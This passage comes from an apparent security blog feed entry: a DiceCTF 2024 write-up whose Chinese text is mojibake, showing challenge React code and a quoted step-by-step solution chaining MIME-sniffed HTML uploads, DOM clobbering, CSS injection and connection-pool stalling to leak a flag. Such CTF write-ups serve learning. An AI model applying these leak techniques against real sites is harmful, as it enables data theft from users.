å‡ºä¾†ã€‚</p><p>ä½†é‡é»æ˜¯ view note çš„é é¢ï¼Œæœƒè‡ªå‹•ç™¼é€è«‹æ±‚æŠŠåœ–ç‰‡åˆªé™¤ï¼Œå‡ºç¾éŒ¯èª¤çš„è©±ä¹Ÿæœƒè·³å‡º <code>alert</code>ï¼š</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> Link<span class="token punctuation">,</span> useParams<span class="token punctuation">,</span> useNavigate <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"react-router-dom"</span><span class="token punctuation">;</span><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">View</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> id <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">useParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> navigate <span class="token operator">=</span> <span class="token function">useNavigate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>paste<span class="token punctuation">,</span> setPaste<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  React<span class="token punctuation">.</span><span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> r <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/api/paste/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">setPaste</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>r<span class="token punctuation">.</span>data<span class="token punctuation">.</span>image<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">await</span> <span class="token function">deletePaste</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>data<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token operator">?.</span>response<span class="token operator">?.</span>data<span class="token operator">?.</span>message <span class="token operator">||</span> e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">navigate</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token function-variable function">deletePaste</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/api/destroy/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token operator">?.</span>response<span class="token operator">?.</span>data<span class="token operator">?.</span>message <span class="token operator">||</span> e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">navigate</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>paste<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>paste<span class="token punctuation">.</span>title<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token punctuation">&#123;</span> paste<span class="token punctuation">.</span>image <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/uploads/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>paste<span class="token punctuation">.</span>image<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">onLoad</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">deletePaste</span><span class="token punctuation">(</span>paste<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">onError</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">deletePaste</span><span class="token punctuation">(</span>paste<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mw-100<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">whiteSpace</span><span class="token operator">:</span> <span class="token string">"pre-line"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mb-2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>paste<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Link</span></span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/home<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">â† Back</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Link</span></span><span class="token punctuation">></span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥ç”¨ meta tag çš„ CSP connect-src é˜»æ­¢åˆªé™¤åœ–ç‰‡çš„è«‹æ±‚ï¼Œä¸¦ä¸”ç”¨ iframe çš„ sandbox é˜»æ­¢è·³å‡º modalã€‚</p><p>ä¸éæˆ‘è¦ºå¾—é€™é¡Œæœ€é›£çš„äº‹æƒ…æ˜¯è¦åœ¨ 30 ç§’å…§æŠŠæ‰€æœ‰äº‹æƒ…åšå®Œï¼Œç­‰æ–¼èªªæ¯ä¸€å€‹ç’°ç¯€éƒ½å¿…é ˆè‡ªå‹•åŒ–ï¼Œé€™å€‹çœŸçš„é›£ã€‚</p><p>åº•ä¸‹é™„ä¸Šä½œè€… strellic çš„è§£æ³•ï¼Œä¸Šé¢æ˜¯åƒè€ƒä»–çš„è§£æ³•å¯«çš„ï¼š</p><ol><li>uploading files as .png or .jpg have no mimetype (old version of fastify static) so they are mime sniffed (no xcto) and you can upload arb html &#x2F; css</li><li>use technique from modernblog (clobber defaultView) and upload arb html that react router thinks is a target path. this lets us add custom html onto any page of the react app we want</li><li>now, we need to leak both the flag post id and username. we do this with css injection and iframes</li><li>we can use css to change the width&#x2F;height of an iframe, and since there is no frame-src, we can point it to our own domain and read these values</li><li>i use window.open to get a window ref, then reading w.frames[0].innerWidth repeatedly</li><li>the only issue is, how do we leak the entire id if on every refresh the post ids change?</li><li>lets use the classic css recursive import (with a twist)</li><li>the issue with recursive import is that you need to import from a server you control. you need this bc you need the next css file request to stop responding until you leak the previous data so you know what css to send. but style-src is self, so we cant stall the next css file - or can we?</li><li>my solution: lets abuse the connection pool! if we  block every socket on another tab, we can stop the css from importing until we are ready, and we unblock and reblock the socket pool at will</li><li>this allows us to control the time at which the next css file is uploaded, essentially letting us recreate the recursive css technique even when we dont control the target server!</li><li>this is a little complicated, we need to remove type module from script tag so it doesnt block, as well as move it to body. in addition we have to start the initial css req in a style tag (which is why unsafe-inline is there), otherwise it blocks</li><li>we also need to create a â€œbufferâ€ of empty css files that just request another one so we can account for the initial api requests (as they happen in tandem with the css requests)</li><li>with this you can leak the post id</li><li>now to leak the username, you do the same technique but need to stop the image from deleting</li><li>use a csp meta tag with connect src to stop it from requesting the destroy endpoint</li><li>but this causes an alert which blocks everything, so you put this in an iframe srcdoc that doesnt allow modals</li><li>do all of this in 30 seconds and you can get the flag! (my solve finishes in 25s with no optimization)</li></ol><h2><span id="å¾Œè¨˜">å¾Œè¨˜</span></h2><p>æœ€è¿‘æœ‰å…¶ä»–äº‹æƒ…åœ¨å¿™ï¼Œæœ‰æ®µæ™‚é–“æ²’æ‰“ CTF äº†ï¼Œç¸½è¦ºå¾—æœ‰é»ç”Ÿç–ï¼Œä¸éæŠŠ safestlist è§£æ‰çœŸçš„æ»¿é–‹å¿ƒçš„ï¼Œä»£è¡¨èº«æ‰‹æ²’æœ‰é€€æ­¥å¤ªå¤šXD</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œé€™ç¯‡ä¹Ÿæ˜¯ç›¸éš”äº†å…©å€‹æœˆä¹‹å¾Œçš„æ›´æ–°ï¼Œæ˜¯ 2024 å¹´çš„ç¬¬ä¸€ç¯‡ï¼Œé›–ç„¶æœ‰é»æ™šäº†ï¼Œä¸éé‚„æ˜¯ç¥å„ä½è®€è€…æ–°å¹´å¿«æ¨‚ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç›¸æ¯”æ–¼&lt;a href=&quot;https://blog.huli.tw/2023/03/26/dicectf-2023-writeup/&quot;&gt;å»å¹´&lt;/a&gt;è·Ÿ&lt;a href=&quot;https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/&quot;&gt;å‰å¹´&lt;/a&gt;ï¼Œä»Šå¹´çš„ web é¡Œé›£åº¦æœ‰é¡¯è‘—é™ä½äº†ä¸å°‘ï¼Œè®Šå¾—æ›´å¹³æ˜“è¿‘äººäº†ï¼Œé è‘—éšŠå‹çš„åŠªåŠ›æ‹¿ä¸‹äº†ç¬¬ä¸€åï¼Œè€Œ web é¡Œä¹Ÿåªå‰©ä¸€é¡Œæ²’è§£å‡ºä¾†ã€‚&lt;/p&gt;
&lt;p&gt;é€™æ¬¡æˆ‘åŸºæœ¬ä¸Šåªè§£äº†ç°¡å–®çš„ funnylogin è·Ÿé›£çš„ safestlistï¼Œå…¶ä»–éƒ½æ˜¯éšŠå‹è§£é–‹çš„ï¼Œé‚„æœ‰å¦ä¸€é¡Œ another-csp æœ‰çœ‹äº†ä¸€ä¸‹ï¼Œå› æ­¤é€™ç¯‡åªæœƒè¨˜æˆ‘æœ‰çœ‹éçš„ä»¥åŠæ¯”è¼ƒé›£çš„é¡Œç›®ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæƒ³çœ‹å…¶ä»–é¡Œï¼Œå¯ä»¥åƒè€ƒå…¶ä»–äººçš„ writeupï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003&quot;&gt;st98 - DiceCTF 2024 Quals writeup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://one3147.tistory.com/77&quot;&gt;0xOne - 2024 Dice CTF Write up [Web]&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å®˜æ–¹æä¾›çš„æ‰€æœ‰é¡Œç›®åŸå§‹ç¢¼ï¼š&lt;a href=&quot;https://github.com/dicegang/dicectf-quals-2024-challenges&quot;&gt;https://github.com/dicegang/dicectf-quals-2024-challenges&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é—œéµå­—åˆ—è¡¨ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;crash chromium&lt;/li&gt;
&lt;li&gt;slower css style&lt;/li&gt;
&lt;li&gt;xsleak&lt;/li&gt;
&lt;li&gt;URL length limit&lt;/li&gt;
&lt;li&gt;service worker&lt;/li&gt;
&lt;li&gt;background fetch&lt;/li&gt;
&lt;li&gt;connection pool + css injection&lt;/li&gt;
&lt;li&gt;iframe width + css inection&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
</feed>
